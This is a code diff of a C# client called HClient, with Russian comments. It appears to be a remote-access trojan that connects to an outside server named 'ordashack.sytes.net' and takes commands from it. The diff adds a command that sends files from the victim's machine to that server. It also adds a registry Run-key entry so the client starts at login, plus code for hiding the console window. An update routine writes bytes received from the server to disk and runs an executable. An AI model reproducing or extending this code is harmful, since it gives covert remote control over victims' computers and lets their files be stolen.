@@ -6,6 +6,8 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 namespace HClient
 {
@@ -13,7 +15,7 @@ namespace HClient
     {
         static Socket mySocket; //инициализзируем сокет;
         static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
-        
+        const double VERSION = 0.7;
         static BinaryWriter writer = new BinaryWriter(ms);
         static BinaryReader reader = new BinaryReader(ms);//чтение из потока
         static string currentDir;//положение директории
@@ -26,16 +28,31 @@ namespace HClient
             {"cd", 2},           //смена директории
             {"introduce", 3},    //получение информации о клиенте
             {"upload", 4 },      //загрузка файла на компютер клиента
+            {"load", 5 },        //скачивание файла с компьютера клиента
             {"check", 100},      //получение информации о версии библиотеки
         };
 
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
         static void Main(string[] args)
-        {
+        {            
+            CheckAutoRun();
+            var handle = GetConsoleWindow();
+            //ShowWindow(handle, SW_HIDE);
+
             Console.Title = "Client";
             connectionIsOn = false;
             currentDir = Environment.CurrentDirectory;// сохраненная директория
             Connection();
-           
+
             checkConnection = new Thread(() =>
             {
                 while (true)//бесконечный цикл проверки состояния подключения
@@ -60,7 +77,7 @@ namespace HClient
             mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет;
             while (!mySocket.Connected)//пока нет подключения
             {
-                
+
                 try
                 {
                     mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
@@ -70,7 +87,7 @@ namespace HClient
                 catch
                 {
                     Console.Write(".");
-                }                
+                }
             }
             connectionIsOn = true;
             Console.Clear();
@@ -81,7 +98,7 @@ namespace HClient
             Task.Run(() => { while (connectionIsOn) recivePocket(); });//запускаем цикл
         }
 
-        
+
         static void sendPocket()//неиспользуемая функция
         {
             ms.Position = 0;
@@ -89,23 +106,23 @@ namespace HClient
             mySocket.Send(ms.GetBuffer());
         }
 
-        private static void recivePocket()//функция пакета с иформацией
+        private static void recivePocket()//функция обработки пакета запроса
         {
             ms.Position = 0;
             mySocket.Receive(ms.GetBuffer());
             string request = reader.ReadString();
             //--------------------------------------------
-            if(request.Equals("update"))
+            if (request.Equals("update"))//если запрос на обнавление
             {
-                Update();
-                
+                Update();//обнавляем
+
             }
             else
             {
                 Request(ref currentDir, request, ms, mySocket);
-                
+
             }
-            
+
         }
 
         private static void introduse()//при подключении передает информацию о себе
@@ -116,20 +133,20 @@ namespace HClient
             writer.Write(Environment.CurrentDirectory);
             mySocket.Send(ms.GetBuffer());
         }
-        
-        private static void Update()
+
+        private static void Update()//обнавление версии
         {
             string path = Environment.CurrentDirectory + "\\update.tmp";
             using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
             {
                 int leng = reader.ReadInt32();
                 byte[] data = new byte[leng];
-               
+
 
                 data = reader.ReadBytes(leng);
                 fs.Write(data, 0, data.Length);
                 // считывает байт в память и переводит каретку на байт вперед
-                ms.Position = 0;                
+                ms.Position = 0;
                 writer.Write("Загрузка завершена.");
                 Process.Start(Environment.CurrentDirectory + "\\HUpdater.exe");
                 Environment.Exit(0);
@@ -144,7 +161,7 @@ namespace HClient
             string[] reqOpt = strigSpliter(req);//обработка строки, массив содержит команду и ее опции
             int code;//сюда будет записан код команды
             codeReq.TryGetValue(reqOpt[0], out code);     //записываем код команды     
-            const double VERSION = 0.4;
+
 
             switch (code)
             {
@@ -202,22 +219,45 @@ namespace HClient
                     ms.Position = 0;
                     socket.Receive(ms.GetBuffer());
                     int length = reader.ReadInt32();
-                    string name = reader.ReadString();
-                    int size = 2000000;
-                    if (length < size)
+                    if (length == -1)
                     {
-                        size = length;
+                        return;
                     }
-                    
-                    //int seekF = 0;
+                    string name = reader.ReadString();
                     ms.Position = 0;
-                    writer.Write("OK. Information has recived.");//код операции
+                    writer.Write("Загрузка начата.");//код операции
                     socket.Send(ms.GetBuffer());
-                    //int procent = 0;
-                    //int part = 100/(length / size);
                     reciveFile(ref socket, length, name);
                     ms.Position = 0;
                     writer.Write("Загрузка завершена.");
+                    break;
+                case 5: //скачивание файла 
+                    string nameFile;
+                    ms.Position = 0;
+                    writer.Write(5);//код операции
+                    socket.Send(ms.GetBuffer());
+                    try
+                    {
+                        nameFile = reqOpt[1];
+                        string pathF = currentDir + "\\" + nameFile; ;
+                        if (!File.Exists(pathF))
+                        {
+                            ms.Position = 0;
+                            writer.Write(-1);
+                        }
+                        else
+                        {
+                            sendFile(ref socket, nameFile);
+                            ms.Position = 0;
+                            writer.Write("Done");
+                        }
+
+                    }
+                    catch
+                    {
+                        ms.Position = 0;
+                        writer.Write(-1);
+                    }
                     break;
                 case 100: //возвращает информацию о версии                    
                     ms.Position = 0;
@@ -234,7 +274,41 @@ namespace HClient
 
         }
 
-        private static void reciveFile(ref Socket socketF,int lenghFile, string nameFile)
+        private static void sendFile(ref Socket socket, string pathF)//скачивание файла с машины клиента
+        {
+            try
+            {
+                using (FileStream fs = new FileStream(pathF, FileMode.Open))
+                {
+
+                    byte[] data = new byte[fs.Length];//массив для файла
+                    int lenghtfile = (int)fs.Length;//размер файла
+                    fs.Read(data, 0, (int)fs.Length);//считываем фаил в массив                                                    
+                    string nameF = pathF.Substring(pathF.LastIndexOf('\\') + 1);//имя файла
+                    ms.Position = 0;
+                    writer.Write(lenghtfile);//передаем размер файла
+                    writer.Write(nameF);//передаем имя
+                    socket.Send(ms.GetBuffer());//отсылаем                    
+                    socket.Receive(ms.GetBuffer());//отсылаем  
+                    ms.Position = 0;
+                    using (MemoryStream msF = new MemoryStream(new byte[lenghtfile], 0, lenghtfile, true, true))
+                    {
+                        BinaryWriter writerF = new BinaryWriter(msF);
+                        fs.Read(data, 0, data.Length);
+                        msF.Position = 0;
+                        writerF.Write(data);
+                        socket.Send(msF.GetBuffer());
+
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+
+        private static void reciveFile(ref Socket socketF, int lenghFile, string nameFile)//загруска файла на машину клиента
         {
             using (MemoryStream msFile = new MemoryStream(new byte[lenghFile], 0, lenghFile, true, true))
             {
@@ -247,12 +321,12 @@ namespace HClient
                     data = readerFile.ReadBytes(lenghFile);
                     fs.Write(data, 0, data.Length);
                     // считывает байт в память и переводит каретку на байт вперед
-                    
+
                 }
             }
 
-            
-                
+
+
         }
 
         private static string[] strigSpliter(string req)
@@ -268,53 +342,16 @@ namespace HClient
                 return retStr;
             }
         }
+
+        private static void CheckAutoRun()
+        {
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            if (rkApp.GetValue("HClientStart") == null)
+            {
+                rkApp.SetValue("HClient", Path.Combine(Directory.GetCurrentDirectory(), "HClient.exe"));
+            }
+
+        }
+
     }
 }
-
-
-
-
-
-/*using (MemoryStream msFile = new MemoryStream(new byte[2000000], 0, 2000000, true, true))
-                    {
-                        byte[] data = new byte[length];
-                        byte[] dataRecive = new byte[size];
-                        BinaryReader readerFile = new BinaryReader(msFile);
-                        bool end = false;
-                        using (FileStream fs = new FileStream(Environment.CurrentDirectory + '\\' + name, FileMode.OpenOrCreate))
-                        {
-                            
-                            while (!end)
-                            {
-
-                                socket.Receive(msFile.GetBuffer());
-                               dataRecive = readerFile.ReadBytes(size);
-
-                                try
-                                {
-                                    Array.Copy(dataRecive, 0, data, seekF, dataRecive.Length);
-                                }
-                                catch (Exception ex)
-                                {
-                                    Console.WriteLine(ex);
-                                }
-
-
-                                seekF += size;
-                                ms.Position = 0;
-                                procent += part;
-                                writer.Write(procent);
-                                socket.Send(ms.GetBuffer());
-                                ms.Position = 0;
-                                socket.Receive(ms.GetBuffer());
-
-                                end = reader.ReadBoolean();
-                                // считывает байт в память и переводит каретку на байт вперед
-                            }
-                            fs.Write(data, 0, length);
-
-                        }
-
-                        ms.Position = 0;
-                        writer.Write("Загрузка завершена.");
-                    }*/
